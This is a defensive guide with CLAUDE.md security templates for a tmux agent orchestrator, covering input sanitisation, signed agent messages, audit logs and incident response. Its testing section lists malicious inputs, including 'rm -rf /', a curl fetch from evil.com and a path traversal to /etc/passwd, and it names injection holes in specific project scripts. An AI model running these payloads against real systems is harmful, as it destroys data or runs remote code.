# Security Templates for CLAUDE.md Files

This document provides security-focused templates for CLAUDE.md files at different directory levels within the Tmux-Orchestrator project.

## Root Level CLAUDE.md Security Section

```markdown
# 🔐 CRITICAL SECURITY CONSTRAINTS 🔐

## Tmux Orchestration Security Requirements

### ABSOLUTE PROHIBITIONS
- 🚫 NEVER pass unsanitized user input to tmux commands
- 🚫 NEVER use shell metacharacters in tmux send-keys without validation
- 🚫 NEVER hardcode credentials or sensitive paths in scripts
- 🚫 NEVER create background processes without resource limits
- 🚫 NEVER skip authentication checks between agents

### MANDATORY SECURITY PRACTICES
- ✅ ALWAYS validate window/session format: `^[a-zA-Z0-9_-]+:[0-9]+$`
- ✅ ALWAYS use tmux send-keys with -l flag for literal strings
- ✅ ALWAYS sanitize messages by removing: `;|&$\`(){}[]<>\"'`
- ✅ ALWAYS check if target window exists before sending commands
- ✅ ALWAYS log all agent operations with timestamps and signatures

### Command Injection Prevention
```bash
# ❌ VULNERABLE - NEVER DO THIS
tmux send-keys -t "$WINDOW" "$USER_INPUT"

# ✅ SECURE - ALWAYS DO THIS
SAFE_INPUT=$(echo "$USER_INPUT" | tr -d ';&|`$(){}[]<>\"'\''')
tmux send-keys -t "$WINDOW" -l "$SAFE_INPUT"
```

### Audit Requirements
Every orchestration operation MUST generate an audit log entry:
```json
{
  "timestamp": "ISO-8601",
  "agent_id": "unique-identifier",
  "operation": "command_type",
  "target": "session:window",
  "status": "success|failure",
  "signature": "hmac-sha256"
}
```
```

## Scripts Directory CLAUDE.md Security Section

```markdown
## 🛡️ Script Security Guidelines

### Pre-Execution Security Checklist
Before running ANY orchestration script:
- [ ] Verify script has proper input validation
- [ ] Confirm no hardcoded sensitive data
- [ ] Check for command injection vulnerabilities
- [ ] Ensure audit logging is implemented
- [ ] Test with malicious inputs in safe environment

### Secure Script Template
All tmux orchestration scripts MUST follow this pattern:

```bash
#!/bin/bash
set -euo pipefail

# Security constants
readonly ALLOWED_WINDOW_PATTERN='^[a-zA-Z0-9_-]+:[0-9]+(\.[0-9]+)?$'
readonly DANGEROUS_CHARS=';&|`$(){}[]<>\"'\'''
readonly MAX_MESSAGE_LENGTH=1000
readonly AUDIT_LOG="/var/log/tmux-orchestrator/audit.log"

# Input validation function
validate_and_send() {
    local target="$1"
    local message="$2"
    
    # Validate target format
    if [[ ! "$target" =~ $ALLOWED_WINDOW_PATTERN ]]; then
        echo "ERROR: Invalid target format" >&2
        return 1
    fi
    
    # Check target exists
    if ! tmux has-session -t "${target%:*}" 2>/dev/null; then
        echo "ERROR: Session does not exist" >&2
        return 1
    fi
    
    # Sanitize message
    local safe_message
    safe_message=$(echo "$message" | tr -d "$DANGEROUS_CHARS" | cut -c1-$MAX_MESSAGE_LENGTH)
    
    # Audit log
    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) ACTION=send_message TARGET=$target LENGTH=${#safe_message}" >> "$AUDIT_LOG"
    
    # Send safely
    tmux send-keys -t "$target" -l "$safe_message"
    return 0
}
```

### Testing Requirements
Every script must be tested with these malicious inputs:
- `"; rm -rf /"`
- `"$(curl evil.com/malware.sh)"`
- `"\`malicious command\`"`
- `"../../../../etc/passwd"`
```

## Agent Communication CLAUDE.md Security Section

```markdown
## 🔒 Secure Agent Communication Protocol

### Message Authentication
All inter-agent messages MUST be authenticated:

```python
import hmac
import hashlib
import time
import json

class SecureAgentMessage:
    def __init__(self, sender_id, recipient_id, content, shared_secret):
        self.sender_id = sender_id
        self.recipient_id = recipient_id
        self.content = content
        self.timestamp = time.time()
        self.signature = self._generate_signature(shared_secret)
    
    def _generate_signature(self, secret):
        message_data = {
            'sender': self.sender_id,
            'recipient': self.recipient_id,
            'content': self.content,
            'timestamp': self.timestamp
        }
        message_json = json.dumps(message_data, sort_keys=True)
        return hmac.new(
            secret.encode('utf-8'),
            message_json.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
    
    def verify(self, shared_secret):
        expected_signature = self._generate_signature(shared_secret)
        return hmac.compare_digest(self.signature, expected_signature)
```

### Secure Channel Requirements
- Messages older than 5 minutes must be rejected
- Each agent pair must have unique shared secrets
- Secrets must be rotated every 24 hours
- Failed authentication must trigger alerts
```

## Project-Specific CLAUDE.md Security Section

```markdown
## 🚨 Project Security Context

### Known Vulnerabilities in This Project
1. **schedule_with_note.sh**: Command injection via message parameter
2. **send-claude-message.sh**: No input validation, allows arbitrary commands
3. **tmux_utils.py**: Weak safety mode, subprocess injection risks
4. **Background processes**: Unlimited nohup usage enables DoS

### Defensive Countermeasures
When working with existing scripts:
- Wrap all script calls with input validation
- Monitor tmux sessions for suspicious commands
- Implement rate limiting on message sending
- Add process count limits per agent

### Security Testing Commands
```bash
# Check for command injection attempts in logs
grep -E '(;|\||&|`|\$\(|{|}|\[|\]|<|>)' /var/log/tmux-orchestrator/*.log

# Monitor agent process counts
ps aux | grep tmux | awk '{print $1}' | sort | uniq -c | sort -rn

# Audit tmux session commands
for session in $(tmux list-sessions -F "#{session_name}"); do
    echo "=== Session: $session ==="
    tmux capture-pane -t "$session" -p | grep -E '(rm|curl|wget|nc|bash|sh)'
done
```
```

## Deployment CLAUDE.md Security Section

```markdown
## 🔐 Production Security Requirements

### Pre-Deployment Security Checklist
- [ ] All scripts pass security review
- [ ] Input validation implemented everywhere
- [ ] Audit logging configured and tested
- [ ] Resource limits applied to all processes
- [ ] Authentication required for all operations
- [ ] Monitoring alerts configured
- [ ] Incident response plan documented
- [ ] Security training completed by all operators

### Monitoring and Alerting
Set up alerts for:
- Command injection patterns in messages
- Authentication failures > 5 per minute
- Process count > 50 per agent
- Disk usage > 80% in log directory
- Network connections to unexpected IPs

### Emergency Response
If security incident detected:
1. Kill all tmux sessions: `tmux kill-server`
2. Preserve evidence: `tar -czf evidence_$(date +%s).tar.gz /var/log/tmux-orchestrator/`
3. Check for persistence: `crontab -l; at -l; systemctl list-timers`
4. Review audit logs for scope
5. Reset all agent credentials
6. Apply security patches before restart
```

## Usage Instructions

1. **For New Projects**: Copy relevant sections into your project's CLAUDE.md
2. **For Existing Projects**: Add security sections to current CLAUDE.md files
3. **For Scripts**: Include security template at the top of each directory
4. **For Agents**: Ensure each agent's instructions include security requirements

Remember: These templates provide defense-in-depth security awareness. The fundamental architecture of tmux-based orchestration has inherent security limitations that cannot be fully mitigated through defensive practices alone.